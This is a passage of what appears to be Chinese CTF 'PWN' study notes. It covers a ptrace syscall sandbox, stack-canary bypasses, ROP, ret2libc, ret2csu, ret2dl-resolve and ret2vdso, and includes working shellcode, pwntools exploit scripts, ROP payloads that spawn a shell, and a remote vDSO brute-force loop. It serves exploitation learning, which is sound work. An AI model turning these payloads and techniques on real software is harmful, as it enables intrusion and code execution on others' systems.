存储进程状态的变量 用于判断进程是否在系统调用的标志 HIDWORD(stat_loc.__iptr) = 0; // iptr指针指向的地址(64位)的高32位置为0 对应源码 int in_syscall = 0 wait((__WAIT_STATUS)\u0026stat_loc); // 父进程等待子进程系统调用, 状态存储在stat_loc if ( ((__int64)stat_loc.__uptr \u0026 0xB00) == 0xB00 ) // __uptr 对应源码的 int status // Linux 进程状态码 以宏解读: -\u003e 判断是否遇到段错误 // 0x100：子进程被跟踪 (ptraced) // 0x200：子进程遇到一个致命信号（如段错误） // 0x800：子进程在执行系统调用时发生错误 LOBYTE(stat_loc.__uptr) != 127 // LOBYTE获取低8位, 127为 wait(pid) pid标识的命令未知的退出状态值 fork v = fork(); // 子进程中返回0，父进程中返回子进程的PID v \u0026 0x80000000 != 0 // 判断 v 有符号数的最高位是否为1，为1则为负数，为0则为正数，判断v是否为负数 if(!v) {} // 进入子进程 ptrace：断点调试和系统调用跟踪 // 一个进程可观察和控制另一个进程的执行 ptrace(enum __ptrace_request op, pid_t pid,void *addr, void *data); v1 = ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL); // 指示该进程由父进程跟踪, 后续参数忽略 v1 = ptrace(PTRACE_ATTACH, pid, 0LL, 0LL); // 跟踪调试指定pid进程, 此时子进程等待, 父进程可使用ptrace调试 ptrace(PTRACE_SYSCALL, v, 0LL, 0LL); // 重新启动停止的子进程 or 挂起子进程，直到子进程发出系统调用，父进程拦截处理 ptrace(PTRACE_KILL, a1, 0LL, 0LL); // 杀掉子进程 ptrace(PTRACE_GETREGS, pid, 0LL, vg); // 获取子进程寄存器状态, 内容存在vg中 // 源码 rax = regs.orig_rax; // IDA中源码将显示 v13 = v26等 需要判断 rdi=regs.rdi; rsi=regs.rsi; rdx=regs.rdx; rcx=regs.rcx; rip=regs.rip; ptrace(PTRACE_SETREGS, pid, 0LL, vg); // 设置子进程pid的寄存器值为vg内容 例子：NepCTF2024——NepBox 子进程：前提 mmap 了一段地址 0xDEAD000，这段空间不仅可以布置 shellcode，还可以在更高的地方存放泄露的 flag 内容，可以向该地址写入 shellcode，且会由子进程执行 父进程：会在子进程调用系统调用前拦截并对系统调用运用白名单处理，，采用 open，read，write 到 stdout 获取 flag 值 case __NR_openat: permission=rdx; goto OpenFile; case __NR_open: permission=rsi; // rsi != 1 OpenFile: if(permission){ ExitAndKillPid(pid); } break; case __NR_read: printf(\"read(%d,%p,0x%x);\\n\",rdi,rsi,rdx); break; case __NR_write: choice=rand()%number; regs.rsi=say[choice]; regs.rdx=strlen(say[choice]); ptrace(PTRACE_SETREGS, pid, NULL, \u0026regs); // 会更改rsi和rdx，flag输出换为其他内容 break; 汇编编写 open, read, write shellcode+基于时间的盲注 from time import time # 用于时间盲注 p=process('./NepBox') base=0xdead000 ''' /* open(file='/flag', oflag=0, mode=0) */ /* push b'/flag\\x00' */ mov rax, 0x101010101010101 push rax mov rax, 0x101010101010101 ^ 0x67616c662f /* '/flag' */ xor [rsp], rax /* 异或后恢复为/flag */ mov rdi, rsp xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call open() */ push SYS_open /* 2 */ pop rax syscall ''' shellcode=shellcraft.open(\"/flag\",0)+''' /* call read(3, 0xdead200, 0x30) */ xor eax, eax /* SYS_read 0 */ push 3 pop rdi push 0x30 pop rdx mov esi, 0x1010101 /* 0x1010101 ^ 0xcebd301 = 233492992 == 0xdead200 */ xor esi, 0xcebd301 syscall /* stdout=1 for(int bytes=0;bytes\u003c=0x30;bytes++){ iLoop for(int bits=0;bits\u003c=0x7;bits++){ jLoop write(stdout,0xdead200+bits+bytes*8,0x1); } } */ mov r13,0 /* 偏移量——当前第几个字节:bytes */ mov r14,0xdead200 /* 基址 */ iLoop: /* 外层循环 遍历每个字节 */ mov r15,0 /* 当前字节第几位: bits */ jLoop: /* 内层循环 遍历每个位 */ lea rax,[r13+r14] /* rax内容置为r13+r14地址 */ mov ax,[rax] /* rax中地址指向的内容: 16位 */ mov rcx,r15 /* rcx 当前位 */ shr ax,cl /* 右移将最低位设置为要读取的位 */ and ax,1 /* \u0026 0x00000001 取最低位的值 */ test ax,ax /* 检查当前位是 0 还是 1 */ jz zero one: /* 进行基于时间的盲注，使得该位为1的时候时间为大于0秒 */ mov r8,0x200000000 /* 不同机器需要变更该延时时间 */ sleep: sub r8,1 jnz sleep /* 延时操作 */ zero: /* write(fd=1, buf=0xdead200+[r13], n=0x1) */ push 1 pop rdi push 0x1 pop rdx mov esi, 0x1010101 /* 233492992 == 0xdead200 */ xor esi, 0xcebd301 add rsi,r13 /* call write() */ push SYS_write /* 1 */ pop rax syscall jLoopEnd: add r15,1 /* cmp r15,7 jbe jLoop iLoopEnd: add r13,1 cmp r13,0x30 jbe iLoop ''' p.sendafter('input',asm(shellcode)) flag='' while len(flag)==0 or flag[-1]!='}': s=0 for i in range(8): now=time() p.recvuntil('!') interval=int(time()-now) if interval: # 当时间差为 1 时 s|=(1\u003c\u003ci) # 在第 i 位上产生一个 1 加入到 s 中, 8 次构成一个字节 flag+=chr(s) print(flag) p.interactive() ","date":"2024-10-09","objectID":"/pwn_note/:11:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"Canary 绕过 格式化字符串读取 canary 的值，canary 最后一个值一定是\"\\x00\"，可以覆盖该值来用%s读取，然后栈溢出再覆盖为 00 Stack smashing：触发 SSP Leak canary 爆破，针对存在 fork 函数，复制出来的程序内存布局都一样，子进程报错退回父进程，canary 不变 劫持 __stack_chk_fail，修改 got 表中该函数地址 已知后门函数距起始位置地址 0xabcd，则覆盖返回地址时只覆盖最低2字节，有1/16概率爆破成功 ","date":"2024-10-09","objectID":"/pwn_note/:12:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"SSP Leak (Stack Smashing Protect)，与 Canary 保护机制有关 栈溢出崩溃，在早期 libc 版本（libc-2.23.so 及以前）中会泄露出一个地址，导致结果包含 Canary 值 #未修复 *** stack smashing detected ***: ./smashes terminated #修复了bug *** stack smashing detected ***: terminated Aborted (core dumped) 低版本 libc 可以通过__stack_chk_fail该泄露出的地址进行操作 canary 检查不符合的时候引起程序终止时，会打印程序名，而程序名作为arg[0]即__libc_argv[0]，存在于stack上 故可以考虑覆盖arg[0]，实现泄露任意地址数据 //早期函数实现 void __attribute__ ((noreturn)) __stack_chk_fail (void) { __fortify_fail (\"stack smashing detected\"); } void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) { /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"\u003cunknown\u003e\"); } gdb 调试，需要覆盖数据为 0x0 的地址处，改为某个地址达成任意地址读，可以通过调试获取，覆盖为elf.sym['flag'] pwndbg\u003e print \u0026__libc_argv[0] #可以在gdb中找到地址 # p __libc_argv获取地址 tele addr查看 49:0248│ 0x7fffffffdf68 —▸ 0x7fffffffe293 ◂— '/home/xx/pwn' 4a:0250│ 0x7fffffffdf70 ◂— 0x0 通过 cyclic 获取所需值在 cyclic 生成的随机数中的偏移 cyclic 0x100 cyclic -l abcdef # Found at offset xxx ","date":"2024-10-09","objectID":"/pwn_note/:12:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"逐字节爆破 漏洞点 while (1) { pid_t pid = fork(); if (pid \u003c 0) {break;} else if (pid \u003e 0) {wait(0);} // 父进程 else {vuln();} //子进程 } 利用：逐字节爆破 canary=b'\\x00' while len(canary) \u003c 8: for c in range(0x100): p.send(b'a'*padding + canary + p8(c)) if not p.recvline_contains('stack smashing detected', timeout=1): canary+=p8(c) break ","date":"2024-10-09","objectID":"/pwn_note/:12:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"劫持函数 劫持__stack_chk_fail函数，其为 libc 中的函数，动态链接在 plt 表中 修改 got 表中__stack_chk_fail函数地址为 backdoor 地址或 gadget 地址，触发 canary 来 getshell 可以通过格式化字符串实现地址写 fmtstr_payload(off, {elf.got['__stack_chk_fail']:elf.sym['backdoor']}) ","date":"2024-10-09","objectID":"/pwn_note/:12:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"覆盖初始值 动态链接：TLS 结构体所在内存可写，canary 与 libc 基址有固定偏移 静态链接：TLS 结构体在堆 heap 中，也可写 当 malloc 一段极大 size 的区域时，主要由 mmap 来实现，此时该区域将靠近 libc， ","date":"2024-10-09","objectID":"/pwn_note/:12:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ROP Return Oriented Programming——返回导向编程：适用于 NX 开启情况 amd64：构造覆盖栈 system /bin/sh pop_rdi_ret（previous return address） 解析：ret 时即(pop eip)此时栈顶为/bin/sh，执行pop rdi，/bin/sh进入rdi，继续 ret 到system执行函数。 无 pop rdi 时 pop rdi 的机器码是 5f c3，而 pop r15 的机器码是 41 5f c3，且一般pop r15之后一般都是紧跟 ret 指令 可以使用pop r15指令的后半部分，即 5f (pop rdi) ","date":"2024-10-09","objectID":"/pwn_note/:13:0","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2syscall 系统调用：x86 通过 int 0x80 指令系统调用，amd64 通过 syscall 指令系统调用 32 位 # x86\rmov eax, 0xb ;系统调用号\rmov ebx, [\"/bin/sh\"] ;参数\rmov ecx, 0\rmov edx, 0\rint 0x80 ;中断号\r# \u003c==\u003e execve(\"/bin/sh\", NULL, NULL) eax 有时也可由函数返回值来控制，如 alarm 第一次调用返回上次设置的 alarm 的剩余时间 0 存在大量的 pop xxx; ret的指令，使得拼接这些 gadget 为 payload 覆盖返回地址后运行到 ret（pop eip），即将栈顶元素的值（指向 gadget 的地址）给 eip，此时 eip 指向了 gadget 并执行 gadget 的内容（pop; ret），此时的 pop 仍然将栈上的值弹出，此时的栈为给指定的寄存器存入值，然后 ret 继续下一步操作，在 Text 段中的 gadget 中连续跳转，最终调用 system call 可以找 libc 中的 gadget（需要泄露 libc 基地址）；也可以找程序中的 gadget 构造栈： int 0x80 address /bin/sh address 0 0 pop_edx_ecx_ebx_ret address 0xb pop_eax_ret address (previous ret address) #使用 flat 函数来构造 ROP字节流 payload = flat([ b'A'*(padding+0x4), pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_ret ]) # flat([gadget1, gadget2, gadget3]) 若 system 传入的参数一定包括其他数据则可以填写\"||sh\"使得执行system(\"xxxx||sh\") 64 位 构造栈：使用linux 系统调用 syscall address 0 0 pop_rsi_rdx_ret address /bin/sh address pop_rdi_ret address 0x3b (execve 调用号) pop_rax_ret address (previous ret address) system 无/bin/sh可以通过栈溢出构造出 read，将/bin/sh 写入到 bss 段中，再 system(bss_addr) elf = ELF(\"./pwn\") read_addr = elf.plt['read'] # 构造利用链 # read(0, bss_addr, 0x10) payload = b'a'*padding + b'b'*ebp_padding payload += p64(pop_rdi_ret) + p64(0) payload += p64(pop_rdx_ret) + p64(bss_addr) payload += p64(pop_rsi_ret) + p64(0x10) payload += p64(read_addr) # system(bss) payload += p64(pop_rdi_ret) + p64(bss) + p64(system) io.send(payload) io.send(\"/bin/sh\") # read函数读入到bss ","date":"2024-10-09","objectID":"/pwn_note/:13:1","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2libc 漏洞点： char s;// [esp+1Ch] [ebp-64h] gets(\u0026s); 思路：篡改栈帧上自返回地址开始的一段区域为一系列 gadget 地址，最终调用 libc 中的函数获取 shell 通用形式： 32 位 or 64 位 “/bin/sh” “/bin/sh” BBBB pop_ret system system 32 位 puts 或 write 泄露 libc 基址：write(1,buf,20) payload = 'a'*(padding+ebp) + write@plt + main + 1 + write@got + 20 # padding \u003e 返回地址 \u003e 预留返回地址 \u003e arg1 \u003e arg2 \u003e arg3 payload = 'a'*(padding+ebp) + puts@plt + main + puts@got # elf.got['puts'] 程序中存在 system 函数，plt 表中可找到，plt 表存在 system 可以直接用 32 位程序传参是通过栈传参，用 ROP 在栈布置参数 构建栈： 0 【exit 的参数】 “/bin/sh” address 【传给 system 的是 binsh 的地址】 exit() 【0xdeadbeef 任意一个地址】 system@plt libc.sym[‘system’] 【previous return address】 system@got → \u0026 system → system code，ret 的时候覆盖\u0026 system地址 解释为何system和\"/bin/sh\"以及exit和0要相隔 1 字节：（也是 ROP 链） 返回地址覆盖为了system函数地址，通过 ret 即 pop eip 将system地址 pop 给eip寄存器，eip指向 system 函数 执行 system 函数开头汇编为push ebp; mov ebp, esp，所以先向栈中 push 了一个 ebp，之后便是将局部变量 local var 压入栈中 被调用函数一般寻找参数是从局部变量向上经过调用函数的 ebp、返回地址后找参数 arg1,2,3….，而此时刚好距离 arg1——\"/bin/sh\"相差一个 ebp 和一个 exit()函数，相隔 2 字节，即找到相应的参数 而之后 exit()函数地址刚好为 system 原返回地址的位置，则继续同样操作达成 ROP 链利用 elf = ELF(\"./ret2libc\") bin_sh = next(elf.search(b\"/bin/sh\")) system_plt = elf.plt[\"system\"] payload = b'A' * padding + p32(system_plt) + b'B' * 4 + p32(bin_sh) 无\"/bin/sh\"情况 需要使用 ROP 来 gets 用户输入的/bin/sh 写入程序中的缓冲区中，再调用 system 函数 或找程序或 libc 文件中是否有 sh 或/bin/sh 找任何一个含有\"sh\"字符的字符串 获得 shell 权限也可通过system($0)实现，$0在机器码中为\\x24\\x30 buf = “/bin/sh” buf system@plt gets@plt aaaaaaaaaa 覆盖为 get 函数后，还需要手动输入\"/bin/sh\"最后会存储到 buf 中 io.send(b\"/bin/sh\\x00\") #加入\\x00避免被阻塞 通过数值输入将/bin/sh输入 send(str(u64(b'/bin/sh\\x00')).encode()) # b'' -\u003e int -\u003e str -\u003e b'' plt 表中不存在 system 函数 无法直接使用，需要泄露出 system 函数的实际地址，泄露主 GOT，攻击主 PLT 泄露 libc 地址：通过其他的类似 puts 函数来泄露真实 libc 中 puts 的地址（got表地址） 本地存在 libc 文件而程序运行时，libc 会被加载入内存的虚拟空间中，即使经过了映射，函数之间的偏移是一样的，puts 地址获取后可以获取 system 函数地址 本地和远程 libc 版本可能不一样，且由于 ASLR，泄露地址必须灵活 尝试p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(execve) 程序不能返回 puts 在 libc 中的地址 则需要 ROP 来获取 libc 中的函数真实地址 一种方法是通过 ROPgadget 来达到系统调用 write 函数来输出 got 表 puts 函数地址 另一种方法是直接将已有的 write@plt 覆盖返回地址，然后传入参数输出 got 表 puts 函数地址 # 32位 payload = b'a'*pad + b'aaaa' + p32(elf.symols[\"write\"]) + p32(new_retn_address) + p32(1) + p32(elf.got[\"write\"]) + p32(4) # 向标准输出写4个字节，输出write函数got表地址 # hex(u32(b'\\xaa\\xbb\\xcc\\xdd')) 获取泄露输出的十六进制地址 # 64位 payload = b'a'*pad + b'aaaaaaaa' + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_r15_ret_addr) + p64(write@got) + p64(0xdeadbeef) + p64(pop_rdx_ret_addr) + p(8) + p64(write@plt) + p64(new_retn_address) # 0xdeadbeef传给r15，r15是多余的 # 8是给rdx的值，即写出一个字节 64 位 二次运行 若只有一次 gets 需要覆盖返回地址进行二次运行，回到 main 或 vuln 函数 # 泄露puts_got表模板 puts_plt = elf.plt['puts'] puts_got = elf.got['puts'] # 泄露libc后更改为libc.sym['environ']可泄露栈附近地址 payload1 = b'a'* padding + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(vul_addr) libc_base = leak_puts_addr - libc.sym['puts'] 当rdi中存储libc的固定偏移函数如funlockfile时，覆盖返回地址为 puts 直接打印地址泄露 libc 地址 下一项由于 puts 无需参数直接填入 main 函数地址进行二次运行 # 获取libc基址 int(xxx, 16) 将十六进制转换为整型；接受数据直到\\n并将\\n丢弃drop libcBase = int(io.recvuntil(b\"\\n\", drop = True), 16) - libc.symbols[\"puts\"] # getshell payload = flat(cyclic(60), libcBase + libc.symbols[\"system\"], 0xdeadbeef, next(elf.search(b\"sh\\x00\"))) system 执行 程序需要栈平衡！ 也可覆盖为 one_gadget 地址 system_address bin_sh_address pop_rdi_ret_address 覆盖返回地址 padding=buf_size + 0x8(rbp) pop rdi地址跳转到pop rdi，执行pop rdi将/bin/sh字符串所在地址pop到rdi中， 执行pop rdi; ret中的ret指令，跳转到system函数地址执行system函数 payload = b'a'*padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) # 直接打入会发生段错误: 一般为指令 movaps xmmword ptr [rsp+0x50],xmm0 指令中表示 rsp+0x50 的地址需要与 16 字节对齐，16 字节表示 0x10，即此处的地址结尾应该为 0 而不是 8，gdb 查看： pwndbg\u003e p $rsp\r$1 = (void *) 0x7ffeaf509298\rpwndbg\u003e p $rsp + 0x50\r$2 = (void *) 0x7ffeaf5092e8 解决 为了对齐，只能让该地址加 8 或减 8，且不影响 payload 的执行，pop rdi和ret，都让rsp的地址递增，因此考虑利用ret让rsp的地址继续加 8 payload = b'a'*padding + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) # 可在libc中ROPgadget找, 通过偏移计算地址, 若开启PIE不可找IDA中程序ret指令, 因为位置无关程序 此处不能使用 system_addr+1 解决，system 第一个指令是endbr644 字节而不是push rbp Disassembly of ","date":"2024-10-09","objectID":"/pwn_note/:13:2","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2csu amd64 特有的一种利用手法，找不到控制 rdx 的 gadget，条件不足以使用 ret2libc 漏洞点 loc_4006A6 retn 后跳转到loc_40690，最终call [r12+rbx*8]也可控，rbx 为 0 则直接调用 r12 中函数，效果：任意函数调用 可以通过 r13, r14, r15 控制 rdx, rsi, edi，需要 rbp 和 rbx 比较时相等，才不会死循环 # write 泄露地址 payload = b'a'*(padding+ebp) + p64(0x4006aa) \\ # pop rbx rbp r12 r13 r14 r15 + p64(0)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])+p64(1) \\ + p64(0x400690) \\ # call r12 cmp时不进入循环继续执行0x4006a6, rsp将抬高8+6*8=56后ret返回地址 + b'a'* 56 + p64(elf.sym['_start']) # 后更换利用链getshell ","date":"2024-10-09","objectID":"/pwn_note/:13:3","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2dl-resolve 不提供 libc，且未开启 PIE 相关结构 .dynamic ：ELF 节中介绍 .dynsym /* Symbol table entry. */ typedef struct { Elf32_Word st_name; /* Symbol name (string tbl index) 字符串相对于起始地址偏移 */ Elf32_Addr st_value; /* Symbol value 符号地址相对于模块基址的偏移 */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding st_other为0则设置为0x12 */ unsigned char st_other; /* Symbol visibility 决定函数参数link_map是否有效*/ // 值不为0则直接通过link_map信息计算目标函数地址, 否则调用_dl_lookup_symbol_x函数查询新的link_map, sym计算 Elf32_Section st_shndx; /* Section index */ } Elf32_Sym; typedef struct { Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */ } Elf64_Sym; .rel.plt /* Relocation table entry without addend (in section of type SHT_REL). */ typedef struct { Elf32_Addr r_offset; /* Address 加上传入参数link_map-\u003el_addr等于该函数对应got表地址*/ Elf32_Word r_info; /* Relocation type and symbol index */ // 符号索引低8位(32)或低32位(64)设为7, 高24位(32)或高32位(64)即Sym构造的数组中的索引 } Elf32_Rel; typedef struct { Elf64_Addr r_offset; /* Address */ Elf64_Xword r_info; /* Relocation type and symbol index */ } Elf64_Rel; link_map struct link_map { ElfW(Addr) l_addr; /* 目标函数基址 */ ... ElfW(Dyn) *l_info[DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM]; /* l_info: Dyn结构体指针 l_info[DT_STRTAB]: 第5项, 指向 .dynstr 对应 Dyn 字段 l_info[DT_SYMTAB]: 第6项, 指向 Sym 对应 Dyn 字段 l_info[DT_JMPREL]: 第23项, 指向 Rel 对应 Dyn 字段 */ _dl_runtime_resolve 函数 为避免_dl_fixup传参与目标函数传参干扰，_dl_runtime_resolve通过栈传参然后转换成_dl_fixup的寄存器传参 _dl_fixup 函数 // 查找目标符号的地址，并将其填入到GOT表中 _dl_fixup(struct link_map *l, ElfW(Word) reloc_arg) { // link_map访问.dynamic 获取符号表地址 const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); // link_map访问.dynamic 获取字符串表地址 const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); // link_map访问.dynamic 获取具体符号函数对应的重定位表项结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小 #define reloc_offset reloc_arg * sizeof (PLTREL) const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); // 具体符号函数对应的符号表项结构地址(指针) const ElfW(Sym) *sym = \u0026symtab[ELFW(R_SYM) (reloc-\u003er_info)]; // 得到函数对应的got地址，即真实函数地址要填回的地址 void *const rel_addr = (void *) (l-\u003el_addr + reloc-\u003er_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; // 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7) assert (ELFW(R_TYPE)(reloc-\u003er_info) == ELF_MACHINE_JMP_SLOT); // 【判断】 // ☆ 【关键判断，决定目标函数地址的查找方法】☆ if (__builtin_expect(ELFW(ST_VISIBILITY) (sym-\u003est_other), 0) == 0) { // link_map 无效: 32位利用 const struct r_found_version *version = NULL; if (l-\u003el_info[VERSYMIDX (DT_VERSYM)] != NULL) {// 处理符号版本信息 const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-\u003er_info)] \u0026 0x7fff; version = \u0026l-\u003el_versions[ndx]; if (version-\u003ehash == 0) version = NULL; } int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) { THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; } #ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL; #endif // 查找目标函数地址 // result 为 libc 的 link_map ，其中有 libc 的基地址 // sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移 result = _dl_lookup_symbol_x(strtab + sym-\u003est_name, l, \u0026sym, l-\u003el_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif // 基址 + 偏移最终算出目标函数地址 value value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-\u003est_value) : 0); } else { // link_map 有效, 即link_map 和 sym 中已是目标函数信息, 直接计算目标函数地址: 64位利用 value = DL_FIXUP_MAKE_VALUE (l, l-\u003el_addr + sym-\u003est_value); result = l; } value = elf_machine_plt_value(l, reloc, value); if (sym != NULL \u0026\u0026 __builtin_expect(ELFW(ST_TYPE) (sym-\u003est_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value)); if (__glibc_unlikely (GLRO(dl_bind_not))) r","date":"2024-10-09","objectID":"/pwn_note/:13:4","tags":["pwn"],"title":"PWN","uri":"/pwn_note/"},{"categories":["Notes","CTF"],"content":"ret2vdso int 0x80慢，会出现大量用户态和内核态切换的开销 Intel 和 AMD 分别实现了 sysenter/sysexit 和 syscall/sysret 快速系统调用指令，不同处理器架构实现不同指令会出现兼容问题，所以 linux 在vdso中实现了vsyscall接口，具体选择由内核决定 ldd /bin/sh可以发现linux-vdso.so.1动态文件 VDSO， VDSO Virtual Dynamically-linked Shared Object，其将内核态的调用映射到用户地址空间的库上，可以看做一个.so动态库链接文件 不同内核 vdso 内容不同，VDSO 中存在syscall; ret且随机化弱，对于 32 位系统有1/256概率命中 gdb vmmap 可查看地址 intel为例： sysenter：Ring3 用户代码调用 Ring0 的系统内核代码；sysexit：Ring0 系统代码返回用户空间 执行sysenter指令的系统必须满足 目标 Ring0 代码段是平坦模式(Flat Mode)的 4GB 可读可执行的非一致代码段 目标 Ring0 堆栈段是平坦模式(Flat Mode)的 4GB 可读可写向上扩展的栈段 sysenter指令不一定成对，不会把sysexit所需返回地址压栈，sysexit返回的地址也不一定是sysenter指令下一个指令地址，sysenter/sysexit指令跳转通过特殊寄存器实现，且用wrmsr指令在 Ring0 中执行来设置寄存器，edx, eax分别设置指定设置值的高 32 位和低 32 位，ecx 指定填充的寄存器： SYSENTER_CS_MSR[0x174]：指定要执行的 Ring0 代码的代码段选择符 SYSENTER_EIP_MSR[0x176]：指定要执行的 Ring0 代码的起始地址 SYSENTER_ESP_MSR[0x175]：指定要执行的 Ring0 代码的栈指针 特性：Ring0 和 Ring3 的代码段描述符、堆栈段描述符在全局描述符表 GDT 中顺序排列，即知道 SYSENTER_CS_MSR 指定的 RIng0 代码段描述符可推算 RIng0 堆栈段描述符及 Ring3 的代码段描述符和堆栈段描述符 Ring3 代码调用 sysenter，CPU：【调用前需要通过 wrmsr 指令已设置好 Ring0 代码信息】 SYSENTER_CS_MSR 值装载到 cs 寄存器 SYSENTER_EIP_MSR 值装载到 eip 寄存器 SYSENTER_CS_MSR 值+8（Ring0 的堆栈段描述符）装载到 ss 寄存器 SYSENTER_ESP_MSR 值装载到 esp 寄存器 特权级切换为 Ring0 若 EFLAGS 寄存器的 VM 标志被置位，则清除该标志 执行指定 Ring0 代码 Ring0 代码执行完毕调用 sysexit 返回 RIng3，CPU：【调用前保证 edx，ecx 正确性】 SYSENTER_CS_MSR 值+16（Ring3 的代码段描述符）装载到 cs 寄存器 edx 值装载到 eip 寄存器 SYSENTER_CS_MSR 值+24（Ring3 的堆栈段描述符）装载到 ss 寄存器 ecx 值装载到 esp 寄存器 特权级切换为 Ring3 继续执行 Ring3 代码 AUXV 辅助向量 LD_SHOW_AUXV环境变量通知程序加载器展示程序运行时的辅助向量（存放在栈上，附带传递给动态链接器的信息），要获取 VDSO 内存地址，先查询AT_SYSINFO 栈底（栈最高地址）存放：[argc][argv][envp][auxiliary][.ascii data for argv/envp]，辅助向量是一系列Elf32_auxv_t结构，gdb auxv 可查看 AUXV 信息 $ LD_SHOW_AUXV=1 elf # whoami/ls AT_SYSINFO_EHDR: 0x12345678 # vdso入口地址 获取 VDSO 爆破 泄露 ld.so 中的_libc_stack_end找到 stack 真实地址，计算 ELF Auxiliary Vector Offset 取出AT_SYSINFO_EHDR ld.so 中的_rtld_global_ro某个偏移也有 VDSO 位置，gdb p 查看_dl_auxv, _dl_vdso_xxx 开了 ASLR：x86 只有 1 字节随机，暴力破解；x64 开启了 PIE 有 11 字节随机，linux 3.18 2.2 后有 18 字节随机 gdb\u003e dump binary memory local_vdso_x32.so start_add end_addr取出 so 文件查看 32 位 爆破或 gdb dump 出 so 文件，file 为LSB shared object，IDA 查看 vdso.so 文件 .text:00000560 public __kernel_sigreturn .text:00000560 __kernel_sigreturn proc near ; DATA XREF: LOAD:00000190↑o .text:00000560 pop eax .text:00000561 mov eax, 77h ; 'w' // addr1: sigreturn系统调用 .text:00000566 int 80h ; LINUX - sys_sigreturn // addr2: eip设置为int 0x80 .text:00000566 ; } // starts at 55F .text:00000568 nop .text:00000569 lea esi, [esi+0] .text:00000569 __kernel_sigreturn endp ; sp-analysis failed 远程爆破 vdso 脚本 RANGE_VDSO = range(0xf7ed0000, 0xf7fd0000, 0x1000) while(True): try: sh = remote('x.x.x.x',x) vdso_addr = random.choice(RANGE_VDSO) sh.send(b'a' * (padding) + p32(elf.symbols['write']) + p32(0) + p32(1) + # fd p32(vdso_addr) + # buf p32(0x2000) # count ) result = sh.recvall() if(len(result) != 0): open('vdso.so', 'wb').write(result) sh.close() log.success(\"Success\") exit(0) sh.close() except Exception as e: sh.close() #!/bin/bash while true do python3 get_vdso.py str=`file vdso.so` if [[ $str == *stripped* ]] then echo $str break else echo $str fi done 利用：依靠 SROP，每次运行 vdso 地址随机化，爆破 vdso 地址再利用 # 爆破代码 # vdso_range = range(0xf76d9000, 0xf77ce000, 0x1000) # 旧版内核 vdso_range = range(0xf7ed0000, 0xf7fd0000, 0x1000) # 新版内核 def bruteforce(): global p global vdso_addr vdso_addr = random.choice(vdso_range) frame = SigreturnFrame(kernel=\"i386\") frame.eax = constants.SYS_execve frame.ebx = bin_sh_addr frame.eip = vdso_addr + 0x566 # address of int 0x80 frame.esp = bss_addr # 不可为空 frame.ebp = bss_addr # 不可为空 # 确保一下几个段寄存器值正确，Ring0返回Ring3时候会用到，gdb调试p $gs,cs,es,ds,ss等查看 frame.gs = 99 frame.cs = 35 frame.es = 43 frame.ds = 43 frame.ss = 43 ret_addr = vdso_addr + 0x561 # address of sigreturn payload = flat([cyclic(0x10c+4), ret_addr, frame]) # 判断 p.send(payload) p.sendline(b'echo pwned') data = p.recvuntil(b'pwned') if data != b'pwned': info('Failed') return main 函数 if __name__ == '__main__': global p, vdso_addr i = 1 while True: print('Try %d' % i) try: bruteforce() 